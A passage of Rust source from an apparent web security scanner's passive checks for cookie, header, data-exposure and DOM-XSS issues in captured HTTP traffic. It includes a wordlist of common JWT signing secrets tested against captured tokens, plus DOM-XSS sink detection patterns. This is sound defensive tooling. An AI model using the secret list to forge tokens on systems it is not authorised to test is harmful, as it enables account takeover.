    LazyLock::new(|| Regex::new(r#"(?i)<input\b[^>]*\btype\s*=\s*["']?password\b[^>]*>"#).unwrap());
static FORM_ACTION: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(r#"(?i)<form\b[^>]*\baction\s*=\s*["']((?:https?:)?//[^"']+)["']"#).unwrap()
});
static SCRIPT_SRC: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(r#"(?i)<script\b[^>]*\bsrc\s*=\s*["']((?:https?:)?//[^"']+)["']"#).unwrap()
});
static META_REFRESH_URL: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(
        r#"(?is)<meta[^>]*http-equiv\s*=\s*["']?refresh["']?[^>]*content\s*=\s*["'][^"']*?url\s*=\s*([^"'>\s]+)"#,
    )
    .unwrap()
});
static ANCHOR_BLANK: LazyLock<Regex> =
    LazyLock::new(|| Regex::new(r#"(?is)<a\b[^>]*\btarget\s*=\s*["']?_blank\b[^>]*>"#).unwrap());
static JAVASCRIPT_URI: LazyLock<Regex> =
    LazyLock::new(|| Regex::new(r#"(?is)\b(?:href|src|action)\s*=\s*["']\s*javascript:"#).unwrap());

pub fn passive(flow: &Exchange, limit: usize) -> Vec<Candidate> {
    let Ok(response) = Message::parse(&flow.response) else {
        return vec![];
    };
    let Ok(request) = Message::parse(&flow.request) else {
        return vec![];
    };
    let body_opt = text_body(&response, limit);
    let mut findings = advanced::passive_parsed(flow, &request, &response, body_opt.as_deref());
    let candidate_limit = (64 * 1024 * 1024
        / (flow
            .request
            .len()
            .saturating_add(flow.response.len())
            .max(1)))
    .clamp(1, 64);
    findings.truncate(candidate_limit);
    // Preserve observed key material even when a response floods the finding
    // budget with cookie policy issues. Display severity still follows the catalog.
    let priority = |id: &str| (id == "private-key", issue_severity(id));
    let mut add = |id: &str, confidence: Confidence, point: &str, detail: String| {
        let incoming = Candidate {
            affected: None,
            issue_id: id.into(),
            confidence,
            insertion_point: point.into(),
            detail,
            evidence: vec![],
        };
        if findings.len() < candidate_limit {
            findings.push(incoming);
        } else if let Some((index, lowest)) = findings
            .iter()
            .enumerate()
            .min_by_key(|(_, c)| priority(&c.issue_id))
            && priority(id) > priority(&lowest.issue_id)
        {
            findings[index] = incoming;
        }
    };
    let html = is_html(&response);
    let mut scopes = BTreeSet::new();
    for (_, cookie) in response
        .headers
        .iter()
        .filter(|(k, _)| k.eq_ignore_ascii_case("Set-Cookie"))
    {
        let attrs: Vec<_> = cookie.split(';').map(str::trim).collect();
        let Some((name, value)) = attrs[0].split_once('=') else {
            continue;
        };
        if value.is_empty() {
            continue;
        }
        let has = |name: &str| {
            attrs.iter().skip(1).any(|a| {
                a.split('=')
                    .next()
                    .is_some_and(|v| v.eq_ignore_ascii_case(name))
            })
        };
        let scope = |name: &str| {
            attrs
                .iter()
                .skip(1)
                .find_map(|a| {
                    a.split_once('=')
                        .filter(|(k, _)| k.eq_ignore_ascii_case(name))
                        .map(|(_, v)| v.to_owned())
                })
                .unwrap_or_default()
        };
        if flow.destination.tls && !has("secure") {
            add(
                "cookie-secure",
                Confidence::Certain,
                name,
                format!("Cookie {name} lacks Secure on an HTTPS response."),
            );
        }
        if !has("httponly") {
            add(
                "cookie-httponly",
                Confidence::Certain,
                name,
                format!("Cookie {name} lacks HttpOnly."),
            );
        }
        if !has("samesite") {
            add(
                "cookie-samesite",
                Confidence::Certain,
                name,
                format!("Cookie {name} has no explicit SameSite attribute."),
            );
        }
        let domain = scope("domain").trim_start_matches('.').to_ascii_lowercase();
        let host = flow.destination.host.to_ascii_lowercase();
        if !domain.is_empty() && host != domain && host.ends_with(&format!(".{domain}")) {
            add(
                "cookie-domain",
                Confidence::Certain,
                name,
                format!("Cookie domain {domain} includes hosts besides {host}."),
            );
        }
        if !scopes.insert((name.to_owned(), domain.clone(), scope("path"))) {
            add(
                "duplicate-cookies",
                Confidence::Certain,
                name,
                format!("Repeated Set-Cookie for {name} with the same domain/path."),
            );
        }
        let lower_name = name.to_ascii_lowercase();
        let secure = has("secure");
        let path_scope = scope("path");
        if lower_name.starts_with("__host-") && (!secure || !domain.is_empty() || path_scope != "/")
        {
            add(
                "cookie-invalid",
                Confidence::Certain,
                name,
                format!(
                    "Cookie {name} uses the __Host- prefix but does not set Secure, Path=/ and an empty Domain."
                ),
            );
        } else if lower_name.starts_with("__secure-") && !secure {
            add(
                "cookie-invalid",
                Confidence::Certain,
                name,
                format!("Cookie {name} uses the __Secure- prefix without Secure."),
            );
        }
        if scope("samesite").eq_ignore_ascii_case("none") && !secure {
            add(
                "cookie-invalid",
                Confidence::Certain,
                name,
                format!("Cookie {name} declares SameSite=None without Secure."),
            );
        }
    }
    if flow.destination.tls
        && !header_values(&response, "Strict-Transport-Security")
            .any(|v| re(r"(?i)(?:^|;)\s*max-age\s*=\s*[1-9][0-9]*\s*(?:;|$)", v))
    {
        add(
            "hsts",
            Confidence::Certain,
            "Strict-Transport-Security",
            "The HTTPS response lacks a positive HSTS max-age.".into(),
        );
    }
    let header_csp = response
        .headers
        .iter()
        .filter(|(k, _)| k.eq_ignore_ascii_case("Content-Security-Policy"))
        .flat_map(|(_, v)| v.split(',').map(str::trim))
        .collect::<Vec<_>>();
    let csp = csp_policies(&response, body_opt.as_deref().unwrap_or(""));
    if html {
        let xfo = header_values(&response, "X-Frame-Options").any(|v| {
            v.split(',')
                .map(str::trim)
                .any(|v| matches!(v.to_ascii_lowercase().as_str(), "deny" | "sameorigin"))
        });
        let frame = header_csp.iter().any(|v| {
            csp_sources(v, &["frame-ancestors"])
                .is_some_and(|src| !src.is_empty() && !src.iter().any(|s| s == "*"))
        });
        if !xfo && !frame {
            add("clickjacking",Confidence::Firm,"framing policy","No enforcing frame-ancestors or valid X-Frame-Options restriction was found. Authentication and page sensitivity require review.".into());
        }
        // Multiple enforced policies intersect: report unsafe script policy only when every policy allows it.
        if !csp.is_empty() && csp_script_unsafe(&csp) {
            add("csp-unsafe-script",Confidence::Firm,"Content-Security-Policy","All enforced CSP policies permit unsafe-inline without a nonce/hash, or unsafe-eval.".into());
        }
    }
    if (html
        || response
            .header("Content-Type")
            .is_some_and(|v| v.contains("javascript")))
        && !header_values(&response, "X-Content-Type-Options").any(|v| {
            v.split(',')
                .any(|v| v.trim().eq_ignore_ascii_case("nosniff"))
        })
    {
        add(
            "nosniff",
            Confidence::Certain,
            "X-Content-Type-Options",
            "Missing nosniff on an HTML or JavaScript response.".into(),
        );
    }
    if header_values(&response, "X-XSS-Protection")
        .any(|v| v.split(';').next().is_some_and(|v| v.trim() == "0"))
    {
        add(
            "xss-filter-disabled",
            Confidence::Certain,
            "X-XSS-Protection",
            "X-XSS-Protection is explicitly zero.".into(),
        );
    }
    let content_types = response
        .headers
        .iter()
        .filter(|(k, _)| k.eq_ignore_ascii_case("Content-Type"))
        .count();
    if content_types > 1 {
        add(
            "multiple-content-types",
            Confidence::Certain,
            "Content-Type",
            format!("The response contains {content_types} Content-Type headers."),
        );
    }
    if content_types == 0 && !response.body.is_empty() && (200..300).contains(&flow.status) {
        add(
            "missing-content-type",
            Confidence::Certain,
            "Content-Type",
            "A successful nonempty response has no Content-Type header.".into(),
        );
    }
    let url = url::Url::parse(&flow.url).ok();
    for (name, value) in url.as_ref().into_iter().flat_map(|u| u.query_pairs()) {
        if !value.is_empty() && password_name(&name) {
            add(
                "password-url",
                Confidence::Firm,
                &name,
                format!("Password-like query parameter {name} has a nonempty value."),
            );
        }
        if value.len() >= 12 && session_name(&name) {
            add(
                "session-url",
                Confidence::Firm,
                &name,
                format!("Session-like query parameter {name} is present."),
            );
        }
    }
    if !flow.destination.tls
        && (request
            .header("Authorization")
            .is_some_and(|v| v.starts_with("Basic "))
            || form_pairs(&request)
                .iter()
                .any(|(k, v)| password_name(k) && !v.is_empty()))
    {
        add(
            "cleartext-password",
            Confidence::Certain,
            "request credentials",
            "A plaintext request contains Basic authorization or a password-like form field."
                .into(),
        );
    }
    if (request.header("Authorization").is_some()
        || request.header("Cookie").is_some_and(|v| {
            v.split(';').any(|c| {
                c.split_once('=')
                    .is_some_and(|(k, _)| session_name(k.trim()))
            })
        }))
        && header_values(&response, "Cache-Control").any(|v| {
            v.split(',')
                .any(|d| d.trim().eq_ignore_ascii_case("public"))
        })
        && !header_values(&response, "Cache-Control").any(|v| {
            let value = v.to_ascii_lowercase();
            value.contains("no-store") || value.contains("private")
        })
    {
        add("cache-sensitive",Confidence::Tentative,"Cache-Control","An authenticated request received an explicitly public-cacheable response; verify whether its content is personalized.".into());
    }
    for token in jwt_tokens(&request) {
        if let Some(secret) = weak_jwt(&token) {
            add(
                "jwt-weak-secret",
                Confidence::Certain,
                "JWT HMAC signature",
                format!(
                    "The captured HS256 signature verifies with the common secret {secret:?}. Rotate the signing key."
                ),
            );
        }
    }
    let mut parameters = form_pairs(&request);
    parameters.extend(
        url.as_ref()
            .into_iter()
            .flat_map(|u| u.query_pairs())
            .map(|(k, v)| (k.into_owned(), v.into_owned())),
    );
    if is_json(&request)
        && let Ok(body) = std::str::from_utf8(&request.body)
    {
        parameters.extend(
            json_spans(body, 4096)
                .into_iter()
                .map(|(k, _, _, v)| (k, v)),
        );
    }
    for (name, value) in &parameters {
        if re(
            r"(?is)^\s*(?:SELECT\s+.{1,500}\s+FROM\s+|INSERT\s+INTO\s+|UPDATE\s+[\w.]+\s+SET\s+|DELETE\s+FROM\s+)",
            value,
        ) {
            add(
                "sql-request",
                Confidence::Certain,
                name,
                format!("Request parameter {name} contains a SQL statement."),
            );
        }
    }
    if let Some(referer) = request
        .header("Referer")
        .and_then(|v| url::Url::parse(v).ok())
        && referer.host_str() != url.as_ref().and_then(|u| u.host_str())
        && let Some((name, _)) = referer
            .query_pairs()
            .find(|(k, v)| !v.is_empty() && (password_name(k) || session_name(k)))
    {
        add(
            "referer-leak",
            Confidence::Firm,
            "Referer",
            format!("Cross-host Referer includes sensitive query parameter {name}."),
        );
    }
    if request.body.starts_with(&[0xac, 0xed, 0, 5])
        || response.body.starts_with(&[0xac, 0xed, 0, 5])
        || request.body.windows(5).any(|window| window == b"rO0AB")
    {
        add(
            "serialized-object",
            Confidence::Firm,
            "Java serialization",
            "A Java serialization stream signature was found in captured HTTP bytes.".into(),
        );
    }
    let ct = response
        .header("Content-Type")
        .unwrap_or("")
        .to_ascii_lowercase();
    if let Some(bytes) = bounded_body(&response, limit) {
        if (bytes.starts_with(b"\x89PNG\r\n\x1a\n") && !ct.contains("png"))
            || (bytes.starts_with(b"\xff\xd8\xff") && !ct.contains("jpeg") && !ct.contains("jpg"))
            || ((bytes.starts_with(b"GIF87a") || bytes.starts_with(b"GIF89a"))
                && !ct.contains("gif"))
        {
            add(
                "wrong-content-type",
                Confidence::Firm,
                "Content-Type",
                format!("Binary response signature conflicts with declared type {ct:?}."),
            );
        }
        if let Some((id, point, detail)) = charset::finding(&response, &bytes) {
            add(id, Confidence::Certain, point, detail);
        }
    }
    let Some(body) = body_opt else {
        return findings;
    };
    for (name, password) in parameters
        .iter()
        .filter(|(k, v)| password_name(k) && v.len() >= 6)
    {
        if body.contains(password) {
            add(
                "password-response",
                Confidence::Certain,
                name,
                format!("The submitted {name} value appears literally in the response body."),
            );
        }
        if request
            .header("Cookie")
            .into_iter()
            .chain(
                response
                    .headers
                    .iter()
                    .filter(|(k, _)| k.eq_ignore_ascii_case("Set-Cookie"))
                    .map(|(_, v)| v.as_str()),
            )
            .any(|v| {
                v.split(';')
                    .any(|c| c.split_once('=').is_some_and(|(_, v)| v == password))
            })
        {
            add(
                "password-cookie",
                Confidence::Certain,
                name,
                format!("The submitted {name} value is also present as a cookie value."),
            );
        }
    }
    if re(
        r"(?s)-----BEGIN (?:RSA |EC |OPENSSH |DSA |ENCRYPTED )?PRIVATE KEY-----[A-Za-z0-9+/=\s]+-----END (?:RSA |EC |OPENSSH |DSA |ENCRYPTED )?PRIVATE KEY-----",
        &body,
    ) || re(
        r"(?s)-----BEGIN PGP PRIVATE KEY BLOCK-----.*?-----END PGP PRIVATE KEY BLOCK-----",
        &body,
    ) {
        add(
            "private-key",
            Confidence::Certain,
            "response body",
            "A complete private-key PEM envelope is present.".into(),
        );
    }
    if sql_error(&body) {
        add(
            "sql-disclosure",
            Confidence::Firm,
            "response body",
            "A database-specific diagnostic appears in the response.".into(),
        );
    }
    if re(
        r"(?m)(?:^\s*at [a-zA-Z_$][\w.$]+\([^\r\n]+\.java:\d+\)|^\s*at\s+[^\r\n]*:\d+:\d+|^\s*from\s+[^\r\n]*:\d+:in\s+|^goroutine \d+ \[running\]:|Traceback \(most recent call last\):|Fatal error: Uncaught [^\r\n]+ in [^\r\n]+ on line \d+|System\.[\w.]+Exception:)",
        &body,
    ) {
        add(
            "stack-trace",
            Confidence::Firm,
            "response body",
            "A recognizable Java, Python, PHP, or .NET stack trace is present.".into(),
        );
    }
    if source_code(&body) {
        add(
            "source-code",
            Confidence::Firm,
            "response body",
            "Server-side source syntax is exposed in the response.".into(),
        );
    }
    for (id, detail) in diagnostic_pages(&body) {
        add(id, Confidence::Firm, "response body", detail.into());
    }
    if html
        && re(r"(?i)<title>\s*(?:Index of |Directory listing for )", &body)
        && re(r#"(?i)(?:parent directory|<a href=|href=["']\?C=)"#, &body)
    {
        add(
            "directory-listing",
            Confidence::Firm,
            "response body",
            "The page has an index title and directory listing navigation.".into(),
        );
    }
    if url
        .as_ref()
        .is_some_and(|u| u.path().ends_with("/robots.txt"))
        && re(r"(?im)^\s*User-agent\s*:", &body)
    {
        add(
            "robots",
            Confidence::Certain,
            "response body",
            "The response contains robots exclusion directives.".into(),
        );
    }
    if openapi(&body) {
        add(
            "openapi",
            Confidence::Certain,
            "response body",
            "A JSON API definition contains a version field and paths object.".into(),
        );
    }
    if let Some(keys) = jwks(&body) {
        add(
            "jwks",
            Confidence::Certain,
            "response body",
            "A JSON Web Key Set is present.".into(),
        );
        if keys["keys"].as_array().is_some_and(|a| {
            a.iter()
                .any(|k| k.get("d").is_some() || k.get("k").is_some())
        }) {
            add(
                "jwk-private",
                Confidence::Certain,
                "response body",
                "A published JWK contains private material (d or symmetric k).".into(),
            );
        }
    }
    if let Some(ip) = PRIVATE_IP
        .find_iter(&body)
        .map(|m| m.as_str())
        .find(|v| v.parse::<std::net::Ipv4Addr>().is_ok())
    {
        add(
            "private-ip",
            Confidence::Certain,
            "response body",
            format!("Internal IPv4 address {ip} is exposed."),
        );
    }
    if let Some(email) = EMAIL.find(&body) {
        add(
            "email",
            Confidence::Certain,
            "response body",
            format!("Email address {} is present.", email.as_str()),
        );
    }
    if let Some(card) = CARD
        .find_iter(&body)
        .find(|m| luhn(m.as_str()) && plausible_card(m.as_str()))
    {
        let digits: String = card.as_str().chars().filter(char::is_ascii_digit).collect();
        add(
            "credit-card",
            Confidence::Tentative,
            "response body",
            format!(
                "A Luhn-valid {}-digit number ending {} is present; confirm whether it is payment data.",
                digits.len(),
                &digits[digits.len() - 4..]
            ),
        );
    }
    if html {
        if re(r#"(?i)<input\b[^>]*\btype\s*=\s*["']?file\b"#, &body) {
            add(
                "file-upload",
                Confidence::Certain,
                "file input",
                "The page contains an HTML file upload input.".into(),
            );
        }
        if PASSWORD_INPUT.find_iter(&body).any(|tag| {
            !re(
                r#"(?i)\bautocomplete\s*=\s*["']?(?:off|new-password)"#,
                tag.as_str(),
            )
        }) {
            add(
                "password-autocomplete",
                Confidence::Firm,
                "password input",
                "A password input does not declare autocomplete=off or new-password.".into(),
            );
        }
        for c in FORM_ACTION.captures_iter(&body) {
            let action = if c[1].starts_with("//") {
                format!("https:{}", &c[1])
            } else {
                c[1].into()
            };
            if url::Url::parse(&action)
                .ok()
                .is_some_and(|u| u.host_str() != url.as_ref().and_then(|v| v.host_str()))
            {
                add(
                    "crossdomain-post",
                    Confidence::Certain,
                    "form action",
                    format!("The form submits to another host: {action}."),
                );
                break;
            }
        }
        if flow.destination.tls
            && (re(
                r#"(?i)<(?:script|iframe|object|embed|link)\b[^>]*(?:src|data|href)\s*=\s*["']http://"#,
                &body,
            ) || re(r#"(?i)<form\b[^>]*\baction\s*=\s*["']http://"#, &body))
        {
            add(
                "mixed-content",
                Confidence::Firm,
                "HTML resource URL",
                "HTTPS HTML references an active resource using http://.".into(),
            );
        }
        for caps in SCRIPT_SRC.captures_iter(&body) {
            let value = if caps[1].starts_with("//") {
                format!("https:{}", &caps[1])
            } else {
                caps[1].into()
            };
            if url::Url::parse(&value).ok().is_some_and(|u| {
                Some(u.host_str().unwrap_or("")) != url.as_ref().and_then(|u| u.host_str())
            }) {
                add(
                    "crossdomain-script",
                    Confidence::Certain,
                    "script src",
                    format!("Page includes external script {value}."),
                );
                break;
            }
        }
        if re(r#"(?i)<input\b[^>]*type\s*=\s*["']?password\b"#, &body)
            && (!flow.destination.tls || re(r#"(?i)<form\b[^>]*action\s*=\s*["']http://"#, &body))
        {
            add(
                "cleartext-password",
                Confidence::Firm,
                "password form",
                "A password form is served over HTTP or posts to a plaintext URL.".into(),
            );
        }
        if let Some(target) = META_REFRESH_URL
            .captures(&body)
            .and_then(|caps| caps.get(1))
            .map(|capture| capture.as_str())
            && url::Url::parse(target).ok().is_some_and(|destination| {
                Some(destination.host_str().unwrap_or(""))
                    != url.as_ref().and_then(|u| u.host_str())
            })
        {
            add(
                "meta-refresh-external",
                Confidence::Firm,
                "meta refresh",
                format!("The page redirects to another origin through meta refresh: {target}."),
            );
        }
        if ANCHOR_BLANK.find_iter(&body).any(|tag| {
            let tag = tag.as_str().to_ascii_lowercase();
            !(tag.contains("noopener") || tag.contains("noreferrer"))
        }) {
            add(
                "target-blank-noopener",
                Confidence::Firm,
                "anchor target",
                "A target=_blank link omits rel=noopener/noreferrer.".into(),
            );
        }
        if JAVASCRIPT_URI.is_match(&body) {
            add(
                "javascript-uri",
                Confidence::Tentative,
                "HTML attribute",
                "An HTML attribute contains a javascript: URI.".into(),
            );
        }
    }
    let ct = response
        .header("Content-Type")
        .unwrap_or("")
        .to_ascii_lowercase();
    let trimmed = body.trim_start().to_ascii_lowercase();
    let json_signature = (trimmed.starts_with('{') || trimmed.starts_with('['))
        && serde_json::from_str::<serde_json::Value>(&body).is_ok()
        && !ct.contains("json")
        && !ct.contains("javascript")
        && !ct.contains("plain");
    if (body.starts_with("%PDF-") && !ct.contains("pdf"))
        || json_signature
        || ((trimmed.starts_with("<!doctype html") || trimmed.starts_with("<html"))
            && !ct.contains("html")
            && !ct.contains("plain"))
    {
        add(
            "wrong-content-type",
            Confidence::Firm,
            "Content-Type",
            format!("Response signature conflicts with declared type {ct:?}."),
        );
    }
    if (300..400).contains(&flow.status) && body.len() > 512 {
        add(
            "long-redirection",
            Confidence::Firm,
            "response body",
            format!(
                "The redirection response carries a {} byte body; review it for sensitive content.",
                body.len()
            ),
        );
    }
    if (html || ct.contains("javascript")) && static_dom(&body, html) {
        add("static-dom",Confidence::Tentative,"captured JavaScript","A direct URL-source-to-DOM/evaluation-sink expression appears in captured source. Browser execution and exploitability have not been verified.".into());
    }
    findings
}

fn password_name(name: &str) -> bool {
    matches!(
        name.to_ascii_lowercase().as_str(),
        "password" | "passwd" | "pass" | "pwd" | "user_password" | "new_password"
    )
}
fn session_name(name: &str) -> bool {
    let n = name.to_ascii_lowercase();
    n.contains("session")
        || matches!(
            n.as_str(),
            "sid" | "jsessionid" | "phpsessid" | "auth_token" | "access_token"
        )
}
fn form_pairs(message: &Message) -> Vec<(String, String)> {
    if !message
        .header("Content-Type")
        .is_some_and(|v| v.starts_with("application/x-www-form-urlencoded"))
    {
        return vec![];
    }
    url::form_urlencoded::parse(&message.body)
        .map(|(k, v)| (k.into_owned(), v.into_owned()))
        .collect()
}
fn luhn(value: &str) -> bool {
    let digits: Vec<_> = value.chars().filter_map(|c| c.to_digit(10)).collect();
    (13..=19).contains(&digits.len())
        && digits.iter().any(|d| *d != digits[0])
        && digits
            .iter()
            .rev()
            .enumerate()
            .map(|(i, n)| {
                let n = if i % 2 == 1 { n * 2 } else { *n };
                if n > 9 { n - 9 } else { n }
            })
            .sum::<u32>()
            % 10
            == 0
}
fn plausible_card(value: &str) -> bool {
    let digits: String = value.chars().filter(char::is_ascii_digit).collect();
    let len = digits.len();
    let prefix2 = digits.get(..2).and_then(|v| v.parse::<u16>().ok());
    let prefix3 = digits.get(..3).and_then(|v| v.parse::<u16>().ok());
    let prefix4 = digits.get(..4).and_then(|v| v.parse::<u16>().ok());
    let prefix6 = digits.get(..6).and_then(|v| v.parse::<u32>().ok());
    let starts = |value: u16| prefix2 == Some(value);
    let starts_one = |value: char| digits.starts_with(value);
    (len == 15 && (starts(34) || starts(37)))
        || (matches!(len, 13 | 16 | 19) && starts_one('4'))
        || (len == 16
            && (prefix2.is_some_and(|p| (51..=55).contains(&p))
                || prefix4.is_some_and(|p| (2221..=2720).contains(&p))))
        || (matches!(len, 16..=19)
            && (prefix4 == Some(6011)
                || starts(65)
                || prefix3.is_some_and(|p| (644..=649).contains(&p))
                || prefix6.is_some_and(|p| (622126..=622925).contains(&p))))
        || (matches!(len, 16..=19) && prefix4.is_some_and(|p| (3528..=3589).contains(&p)))
        || (len == 14 && prefix2.is_some_and(|p| (30..=38).contains(&p)))
        || (matches!(len, 16..=19) && starts(62))
        || (matches!(len, 12..=19)
            && matches!(
                prefix4,
                Some(5018 | 5020 | 5038 | 6304 | 6759 | 6761 | 6762 | 6763)
            ))
}
/// A JWT-shaped string whose header decodes to JSON with an `alg` member.
/// Custom headers and bodies are included, not only Authorization and Cookie.
fn looks_like_jwt(token: &str) -> bool {
    let parts: Vec<_> = token.split('.').collect();
    if parts.len() != 3 {
        return false;
    }
    URL_SAFE_NO_PAD
        .decode(parts[0])
        .ok()
        .and_then(|bytes| serde_json::from_slice::<serde_json::Value>(&bytes).ok())
        .is_some_and(|header| header.get("alg").is_some_and(|alg| alg.is_string()))
}

fn jwt_tokens(request: &Message) -> Vec<String> {
    static JWT: LazyLock<Regex> = LazyLock::new(|| {
        Regex::new(r"[A-Za-z0-9_-]{8,}\.[A-Za-z0-9_-]{8,}\.[A-Za-z0-9_-]*").unwrap()
    });
    let mut values = Vec::new();
    for (_, value) in &request.headers {
        if let Some((scheme, token)) = value.split_once(' ')
            && scheme.eq_ignore_ascii_case("bearer")
            && looks_like_jwt(token)
        {
            values.push(token.to_owned());
        }
        for found in JWT.find_iter(value) {
            if looks_like_jwt(found.as_str()) {
                values.push(found.as_str().to_owned());
            }
        }
    }
    if let Ok(body) = std::str::from_utf8(&request.body) {
        for found in JWT.find_iter(body) {
            if looks_like_jwt(found.as_str()) {
                values.push(found.as_str().to_owned());
            }
        }
    }
    values.sort();
    values.dedup();
    values
}

/// Replace a token wherever it occurs in the request, including the body.
fn replace_token(request: &Message, token: &str, replacement: &str) -> Message {
    let mut altered = request.clone();
    let mut body_changed = false;
    for (_, value) in &mut altered.headers {
        if value.contains(token) {
            *value = value.replace(token, replacement);
        }
    }
    if let Ok(body) = std::str::from_utf8(&altered.body)
        && body.contains(token)
    {
        altered.body = body.replace(token, replacement).into_bytes();
        body_changed = true;
    }
    if body_changed {
        altered.normalize_length();
    }
    altered
}
fn hmac_digest<D: Digest>(key: &[u8], data: &[u8], block_size: usize) -> Vec<u8> {
    let mut block = vec![0u8; block_size];
    if key.len() > block_size {
        let digest = D::digest(key);
        block[..digest.len()].copy_from_slice(&digest);
    } else {
        block[..key.len()].copy_from_slice(key);
    }
    let inner_key: Vec<u8> = block.iter().map(|b| b ^ 0x36).collect();
    let outer_key: Vec<u8> = block.iter().map(|b| b ^ 0x5c).collect();
    let mut inner = D::new();
    inner.update(&inner_key);
    inner.update(data);
    let inner = inner.finalize();
    let mut outer = D::new();
    outer.update(&outer_key);
    outer.update(inner);
    outer.finalize().to_vec()
}
fn hmac_sha256(key: &[u8], data: &[u8]) -> Vec<u8> {
    hmac_digest::<Sha256>(key, data, 64)
}
fn weak_jwt(token: &str) -> Option<&'static str> {
    let p: Vec<_> = token.split('.').collect();
    if p.len() != 3 {
        return None;
    }
    let header: serde_json::Value =
        serde_json::from_slice(&URL_SAFE_NO_PAD.decode(p[0]).ok()?).ok()?;
    let algorithm = header["alg"].as_str()?;
    let signature = URL_SAFE_NO_PAD.decode(p[2]).ok()?;
    let input = format!("{}.{}", p[0], p[1]);
    let verify = |key: &[u8]| match algorithm {
        "HS256" => hmac_sha256(key, input.as_bytes()) == signature,
        "HS384" => hmac_digest::<Sha384>(key, input.as_bytes(), 128) == signature,
        "HS512" => hmac_digest::<Sha512>(key, input.as_bytes(), 128) == signature,
        _ => false,
    };
    [
        "secret",
        "password",
        "123456",
        "changeme",
        "your-256-bit-secret",
        "your-secret",
        "jwt_secret",
        "admin",
        "test",
        "key",
        "secretkey",
        "secret_key",
        "jwt-secret",
        "jwtkey",
        "jwt_key",
        "supersecret",
        "super_secret",
        "mysecret",
        "my_secret",
        "private",
        "privatekey",
        "token",
        "tokensecret",
        "auth",
        "authsecret",
        "api",
        "apikey",
        "api_secret",
        "development",
        "dev",
        "production",
        "prod",
        "staging",
        "qwerty",
        "letmein",
        "welcome",
        "passw0rd",
        "p@ssw0rd",
        "12345678",
        "123456789",
        "1234567890",
        "abcdef",
        "abc123",
        "foo",
        "bar",
        "foobar",
        "example",
        "default",
        "testkey",
        "test-secret",
        "s3cr3t",
        "correcthorsebatterystaple",
    ]
    .into_iter()
    .find(|key| verify(key.as_bytes()))
}
/// Blank comments, string literals and regex literals, then match sinks that
/// consume URL-controlled data. The tokenizer is heuristic but bounded and
/// operates in place on a single byte buffer.
fn static_dom(body: &str, html: bool) -> bool {
    static SCRIPT_BODY: LazyLock<Regex> =
        LazyLock::new(|| Regex::new(r"(?is)<script\b[^>]*>(.*?)</script\s*>").unwrap());
    static SINKS: LazyLock<regex::bytes::Regex> = LazyLock::new(|| {
        regex::bytes::Regex::new(
            r"(?s)(?:document\.(?:write|writeln)|eval|execScript|setTimeout|setInterval|Function)\s*\(\s*(?:window\.)?(?:document\.)?(?:location\.(?:hash|search|href|pathname)|document\.(?:URL|documentURI|referrer))|\.(?:innerHTML|outerHTML)\s*=\s*(?:window\.)?(?:document\.)?(?:location\.(?:hash|search|href|pathname)|document\.(?:URL|documentURI|referrer))|\.insertAdjacentHTML\s*\(\s*[^)]{0,160}(?:location\.(?:hash|search|href|pathname)|document\.(?:URL|documentURI|referrer))|\$\([^)]{0,160}(?:location\.(?:hash|search|href|pathname)|document\.(?:URL|documentURI|referrer))",
        )
        .unwrap()
    });
    let scan = |script: &str| {
        let bytes = script.as_bytes();
        let mut code = vec![b' '; bytes.len()];
        let mut i = 0;
        let mut quote: Option<u8> = None;
        let mut line = false;
        let mut block = false;
        let mut regex = false;
        let mut regex_class = false;
        let mut regex_ok = true;
        while i < bytes.len() {
            if line {
                if bytes[i] == b'\n' {
                    line = false;
                }
                i += 1;
                continue;
            }
            if block {
                if bytes[i..].starts_with(b"*/") {
                    block = false;
                    i += 2;
                } else {
                    i += 1;
                }
                continue;
            }
            if let Some(delimiter) = quote {
                if bytes[i] == b'\\' {
                    i = (i + 2).min(bytes.len());
                } else {
                    if bytes[i] == delimiter {
                        quote = None;
                    }
                    i += 1;
                }
                continue;
            }
            if regex {
                if bytes[i] == b'\\' {
                    i = (i + 2).min(bytes.len());
                } else {
                    if regex_class {
                        if bytes[i] == b']' {
                            regex_class = false;
                        }
                    } else if bytes[i] == b'[' {
                        regex_class = true;
                    } else if bytes[i] == b'/' {
                        regex = false;
                        regex_ok = false;
                    }
                    i += 1;
                }
                continue;
            }
            let byte = bytes[i];
            if byte == b'/' && bytes[i..].starts_with(b"//") {
                line = true;
                i += 2;
                continue;
            }
            if byte == b'/' && bytes[i..].starts_with(b"/*") {
                block = true;
                i += 2;
                continue;
            }
            if byte == b'/' && regex_ok {
                regex = true;
                regex_class = false;
                i += 1;
                continue;
            }
            if matches!(byte, b'\'' | b'"' | b'`') {
                quote = Some(byte);
                i += 1;
                continue;
            }
            code[i] = byte;
            regex_ok = byte.is_ascii_whitespace()
                || matches!(
                    byte,
                    b'(' | b','
                        | b'='
                        | b':'
                        | b'['
                        | b'!'
                        | b'&'
                        | b'|'
                        | b'?'
                        | b'{'
                        | b'}'
                        | b';'
                        | b'+'
                        | b'-'
                        | b'*'
                        | b'%'
                        | b'<'
                        | b'>'
                        | b'~'
                        | b'^'
                );
            i += 1;
        }
        SINKS.is_match(&code)
    };
    if html {
        SCRIPT_BODY
            .captures_iter(body)
            .any(|capture| scan(&capture[1]))
    } else {
        scan(body)
    }
}
fn diagnostic_pages(body: &str) -> Vec<(&'static str, &'static str)> {
    let mut out = Vec::new();
    if re(
        r"(?i)<title>\s*(?:Application Trace|Trace Information)",
        body,
    ) && body.contains("Request Details")
        && body.contains("Trace")
    {
        out.push((
            "asp-trace",
            "An ASP.NET tracing interface exposes request diagnostics.",
        ));
    }
    if body.contains("phpinfo()")
        && re(r"(?i)PHP Version\s*[0-9]", body)
        && body.contains("PHP Variables")
    {
        out.push((
            "phpinfo",
            "A PHP information page exposes runtime variables and version details.",
        ));
    }
    if re(r"(?s)<configuration[\s>]", body)
        && re(r"<(?:connectionStrings|system\.web|appSettings)[\s>]", body)
    {
        out.push((
            "web-config",
            "An ASP.NET configuration document is exposed.",
        ));
    }
    out
}

impl Probe {
    pub(super) fn follow_redirects(&self) -> bool {
        !matches!(self.matcher, Matcher::Stylesheet(_))
            && !matches!(
                self.issue_id.as_str(),
                "input-stored" | "input-transformed-stored"
            )
    }

    /// Timing and state-changing probes must not overlap other scanner requests:
    /// target load can manufacture a timing differential or invalidate ordering.
    pub fn serial(&self) -> bool {
        self.raw
            || match &self.matcher {
                Matcher::Series { family, .. } => family.ends_with("-time"),
                Matcher::Advanced(m) => m.serial(),
